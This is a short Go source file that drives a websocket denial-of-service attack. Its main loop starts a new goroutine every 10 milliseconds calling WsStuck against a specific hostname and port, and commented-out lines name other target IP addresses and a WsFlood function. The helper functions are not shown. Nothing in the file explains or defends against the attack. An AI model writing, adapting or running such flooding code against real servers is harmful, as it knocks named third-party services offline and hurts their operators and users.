package main

import (
	"math/rand"
	"time"

	"github.com/gorilla/websocket"
)

func main() {
	// analyze("101.32.221.233")
	// analyze("202.81.231.112")
	// return
	// url, err := url.Parse("http://127.0.0.1:8889")
	// if err != nil {
	// 	panic(err)
	// }
	dial = &websocket.Dialer{
		// Proxy:            http.ProxyURL(url),
		HandshakeTimeout: 10 * time.Second,
	}
	rand.Seed(114514)
	// LoadWord()
	for true {
		// go WsFlood(false)
		// go WsStuck("202.81.231.112:37705")
		go WsStuck("e1.kaifuxia.com:11369")
		time.Sleep(10 * time.Millisecond)
	}
	time.Sleep(1000 * time.Second)
}
